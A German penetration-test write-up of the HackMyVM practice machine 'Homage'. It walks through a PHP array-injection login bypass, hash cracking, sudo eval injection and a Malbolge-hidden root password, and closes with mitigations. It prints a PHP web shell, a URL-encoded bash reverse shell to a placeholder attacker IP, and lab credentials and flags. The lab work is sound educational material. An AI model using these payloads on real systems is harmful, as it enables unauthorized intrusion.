# Homage (HackMyVM) - Penetration Test Bericht

![Homage.png](Homage.png)

**Datum des Berichts:** 7. November 2022  
**VM:** Homage  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Homage))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Homage_HackMyVM_Medium/](https://alientec1908.github.io/Homage_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (Login Bypass & SSH)](#phase-2-web-enumeration--initial-access-login-bypass--ssh)
5.  [Phase 3: Privilege Escalation (Kette)](#phase-3-privilege-escalation-kette)
    *   [l4nr3n -> www-data (Web Shell via unsichere Verzeichnisberechtigungen)](#l4nr3n---www-data-web-shell-via-unsichere-verzeichnisberechtigungen)
    *   [www-data -> softy_hack (Passwort-Crack aus Web-Archiv)](#www-data---softy_hack-passwort-crack-aus-web-archiv)
    *   [softy_hack -> d4t4s3c (DB-Enumeration & Passwort-Crack)](#softy_hack---d4t4s3c-db-enumeration--passwort-crack)
    *   [d4t4s3c -> sml (Sudo/eval Injection in Shell-Skript)](#d4t4s3c---sml-sudoeval-injection-in-shell-skript)
    *   [sml -> root (Malbolge Code Decryption)](#sml---root-malbolge-code-decryption)
6.  [Proof of Concept (Finale Root-Eskalation)](#proof-of-concept-finale-root-eskalation)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Homage" von HackMyVM (Schwierigkeitsgrad: Medium). Der initiale Zugriff wurde durch Umgehung einer passwortgeschützten Webseite (`index.php`) mittels einer PHP Array Injection Technik (Änderung von `login=user&password=pass` zu `login[]=user&password[]=pass`) erlangt. Dies enthüllte die Zugangsdaten für den Benutzer `l4nr3n` (`thisVMsuckssomuchL0L`), womit ein SSH-Login möglich war.

Die Privilegieneskalation erfolgte in einer komplexen Kette:
1.  **l4nr3n -> www-data:** Unsichere Berechtigungen (`rwx` für `others`) auf `/var/www/html` erlaubten das Hochladen einer PHP-Web-Shell, um Befehle als `www-data` auszuführen.
2.  **www-data -> softy_hack:** Analyse alter HTML-Dateien in `/var/www/html/HMV_old_archives/` enthüllte MD5-Hashes. Einer davon (`91fb7ea6c76b087b53068d91195948c8`) wurde zu `1passwordonly` geknackt, was das SSH-Passwort für `softy_hack` war.
3.  **softy_hack -> d4t4s3c:** `softy_hack` hatte Zugriff auf eine lokale MariaDB-Instanz. In der Datenbank `hmv_db` wurde in der Tabelle `hmv_users` ein phpass-Hash (`$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.`) für den Benutzer `d4t4s3c` gefunden. Dieser wurde zu `jaredlee` geknackt, was den Benutzerwechsel zu `d4t4s3c` ermöglichte.
4.  **d4t4s3c -> sml:** `d4t4s3c` konnte ein Shell-Skript (`/home/sml/clean.sh`) per `sudo` als Benutzer `sml` ausführen. Dieses Skript enthielt eine `eval`-Schwachstelle, die durch manipulierte Kommandozeilenargumente zur Ausführung von Code als `sml` ausgenutzt wurde.
5.  **sml -> root:** Im Home-Verzeichnis von `sml` wurde eine Datei (`secret/execute_me`) mit Malbolge-Code gefunden. Die Ausführung/Analyse dieses Codes (z.B. mit einem Online-Interpreter) enthüllte das Root-Passwort: `cr4zyw0rld123`.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `Burp Suite` (impliziert für Login Bypass)
*   `ssh`
*   `sudo`
*   `ls`, `cat`
*   `nano` (oder anderer Editor)
*   `curl` (impliziert für Webshell-Nutzung)
*   `nc (netcat)`
*   `for` loop (shell-scripting)
*   `tail`, `awk`
*   `Crackstation` (Webservice zum Hash-Cracken)
*   `ss`
*   `mysql` client
*   `echo`
*   `john` (John the Ripper)
*   `su`
*   `Malbolge Interpreter` (Webservice)

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.114` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.114 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian
        *   **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian), Seitentitel "Password protected page", Hostname `webmaster.hmv`.
    *   `nikto` auf Port 80 meldete fehlende Sicherheitsheader und eine Standard-Apache-Datei, aber keine kritischen Schwachstellen.

---

## Phase 2: Web Enumeration & Initial Access (Login Bypass & SSH)

1.  **Verzeichnis-Enumeration (Gobuster):**
    *   `gobuster dir -u "http://192.168.2.114" [...]` fand `index.php` und `secret.php`.

2.  **Login Bypass (PHP Array Injection):**
    *   Die Login-Seite `index.php` war anfällig für PHP Array Injection.
    *   Ein normaler Login-Versuch (`login=ben&password=cscs`) wurde mit einem Proxy (z.B. Burp Suite) abgefangen und die Parameter zu `login[]=ben&password[]=cscs` modifiziert.
    *   Das Absenden dieser modifizierten Anfrage umging die Authentifizierung.

3.  **Credential Exposure:**
    *   Nach dem erfolgreichen Bypass wurden "Access codes" auf der Seite angezeigt:
        `l4nr3n:thisVMsuckssomuchL0L`

4.  **SSH-Login als `l4nr3n`:**
    *   Mit den gefundenen Zugangsdaten wurde ein SSH-Login durchgeführt:
        ```bash
        ssh l4nr3n@homage.hmv 
        # Passwort: thisVMsuckssomuchL0L
        ```
    *   Der Login war erfolgreich.

---

## Phase 3: Privilege Escalation (Kette)

### l4nr3n -> www-data (Web Shell via unsichere Verzeichnisberechtigungen)

1.  **Enumeration als `l4nr3n`:**
    *   `sudo -l` zeigte keine `sudo`-Rechte für `l4nr3n`.
    *   Das Web-Root-Verzeichnis `/var/www/html` hatte unsichere Berechtigungen (`drwxr-xrwx`), die es jedem Benutzer erlaubten, dort Dateien zu erstellen/löschen.

2.  **Web Shell Upload:**
    *   Als `l4nr3n` wurde eine PHP-Web-Shell (`shell.php`) in `/var/www/html` erstellt:
        ```php
        <?php system($_GET['cmd']); ?>
        ```
3.  **Reverse Shell als `www-data`:**
    *   Über die Web-Shell (`http://192.168.2.114/shell.php?cmd=[payload]`) wurde eine Bash-Reverse-Shell zu einem `nc`-Listener auf dem Angreifer-System gestartet:
        ```bash
        # Auf Angreifer-Maschine:
        # nc -lvnp 9001
        # Über Web-Shell (URL-kodiert):
        # /shell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[Angreifer-IP]%2F9001%200%3E%261%27
        ```
    *   Dies gewährte eine interaktive Shell als `www-data`.

### www-data -> softy_hack (Passwort-Crack aus Web-Archiv)

1.  **Analyse von Web-Archiven:**
    *   Als `www-data` wurde das Verzeichnis `/var/www/html/HMV_old_archives/` untersucht. Es enthielt zahlreiche HTML-Dateien.
    *   Eine `for`-Schleife extrahierte aus der jeweils letzten Zeile dieser Dateien Zeichenketten, die sich als MD5-Hashes herausstellten:
        ```bash
        www-data@homage:/var/www/html/HMV_old_archives$ for i in $(ls);do tail -n 1 $i | awk '{print $1}';done
        ```
2.  **Hash-Cracking:**
    *   Die Hashes wurden bei Crackstation.net eingegeben.
    *   Der Hash `91fb7ea6c76b087b53068d91195948c8` wurde zu `1passwordonly` geknackt.

3.  **SSH-Login als `softy_hack`:**
    *   Das Passwort `1passwordonly` wurde erfolgreich für einen SSH-Login als `softy_hack` verwendet.

### softy_hack -> d4t4s3c (DB-Enumeration & Passwort-Crack)

1.  **Datenbank-Enumeration:**
    *   Als `softy_hack` zeigte `ss -tulpe` einen MySQL/MariaDB-Dienst auf `127.0.0.1:3306`.
    *   Der Login zur Datenbank als `softy_hack` mit dem Passwort `1passwordonly` war erfolgreich:
        ```bash
        mysql -u softy_hack -p
        ```
    *   In der Datenbank `hmv_db`, Tabelle `hmv_users`, wurde der phpass-Hash für den Benutzer `d4t4s3c` gefunden: `$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.`.

2.  **Hash-Cracking:**
    *   Der Hash wurde mit `john --wordlist=/usr/share/wordlists/rockyou.txt hash` geknackt.
    *   Das Passwort für `d4t4s3c` lautete: `jaredlee`.

3.  **Benutzerwechsel zu `d4t4s3c`:**
    *   `softy_hack@homage:~$ su d4t4s3c` mit dem Passwort `jaredlee` war erfolgreich.

### d4t4s3c -> sml (Sudo/eval Injection in Shell-Skript)

1.  **Sudo-Rechte-Prüfung für `d4t4s3c`:**
    *   `sudo -l` zeigte:
        ```
        User d4t4s3c may run the following commands on homage:
            (sml : sml) NOPASSWD: /bin/bash /home/sml/clean.sh
        ```
2.  **Analyse des Skripts `/home/sml/clean.sh`:**
    *   Das Skript enthielt eine Funktion, die Kommandozeilenargumente verarbeitete und die unsichere Zeile `eval $parameter=$value` verwendete.

3.  **Ausnutzung der `eval`-Injection:**
    *   Durch ein speziell gestaltetes Argument konnte beliebiger Code eingeschleust werden:
        ```bash
        sudo -u sml /bin/bash /home/sml/clean.sh '--dummy=x;bash'
        ```
    *   Dies gewährte eine interaktive Shell als Benutzer `sml`.

### sml -> root (Malbolge Code Decryption)

1.  **Enumeration als `sml`:**
    *   Im Verzeichnis `/home/sml/secret/` wurden die Dateien `execute_me` und `note.txt` gefunden.
    *   `cat execute_me` zeigte einen langen, obfuskierten String.

2.  **Malbolge-Code-Analyse:**
    *   Der Inhalt von `execute_me` wurde als Code in der esoterischen Programmiersprache Malbolge identifiziert.
    *   Die Ausführung/Analyse dieses Codes mit einem Online-Interpreter (z.B. `https://malbolge.doleczek.pl/`) enthüllte die Root-Zugangsdaten:
        `root:cr4zyw0rld123`

---

## Proof of Concept (Finale Root-Eskalation)

**Kurzbeschreibung:** Nachdem das Root-Passwort (`cr4zyw0rld123`) durch die Analyse des Malbolge-Codes im Home-Verzeichnis des Benutzers `sml` aufgedeckt wurde, konnte direkt zum `root`-Benutzer gewechselt werden.

**Schritte (als `sml`):**
1.  Führe den Befehl `su root` aus:
    ```bash
    sml@homage:~/secret$ su root
    ```
2.  Gib das gefundene Passwort `cr4zyw0rld123` ein.
**Ergebnis:** Der Prompt wechselt zu `root@homage:...#`, was den erfolgreichen Root-Zugriff bestätigt.

---

## Flags

*   **User Flag (`/home/l4nr3n/user.txt` - Pfad angenommen, basierend auf initialem Login):**
    ```
    174b069e3f6d5c9313f176b3f27c106b
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    beb1adf8585c4cb47aa1cb109813a210
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Web-Authentifizierung:**
    *   **DRINGEND:** Beheben Sie die PHP Array Injection Schwachstelle in `index.php`. Validieren Sie Eingabedaten serverseitig strikt (Typ, Länge, Format) und verwenden Sie sichere Vergleichsmethoden.
    *   Geben Sie niemals Zugangsdaten oder andere sensible Informationen direkt auf Webseiten nach einem Login aus.
*   **Webserver-Sicherheit:**
    *   **Korrigieren Sie die unsicheren Berechtigungen (`rwx` für `others`) für `/var/www/html`**. Setzen Sie restriktive Berechtigungen (z.B. `755`).
    *   Entfernen Sie alte oder nicht mehr benötigte Archivdateien (wie in `HMV_old_archives`) und stellen Sie sicher, dass keine sensiblen Daten (wie Passwort-Hashes) darin enthalten sind.
*   **Passwortsicherheit und -management:**
    *   Erzwingen Sie starke, einzigartige Passwörter für alle System- und Datenbankbenutzer.
    *   Verbieten Sie die Wiederverwendung von Passwörtern.
    *   Speichern Sie Datenbank-Passwörter mit modernen, starken Hashing-Algorithmen (z.B. bcrypt, Argon2).
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln.
        *   Entfernen Sie die Regel, die `d4t4s3c` erlaubt, `/home/sml/clean.sh` als `sml` auszuführen, oder sichern Sie das Skript ab, indem die `eval`-Schwachstelle entfernt wird. **Vermeiden Sie `eval` in Skripten, die mit erhöhten Rechten laufen.**
*   **Schutz vor Obfuskation:**
    *   Das Speichern von sensiblen Daten (wie Root-Passwörtern) in obfuskiertem Code (z.B. Malbolge) in Benutzerdateien ist keine verlässliche Sicherheitsmaßnahme. Solche Daten sollten niemals auf diese Weise gespeichert werden.
*   **Datenbank-Sicherheit:**
    *   Beschränken Sie den Zugriff auf Datenbanken und verwenden Sie separate, starke Passwörter für Datenbankbenutzer.
*   **Allgemeine Systemhärtung:**
    *   Implementieren Sie File Integrity Monitoring (FIM).
    *   Überwachen Sie SSH-Logins und Systemprozesse auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
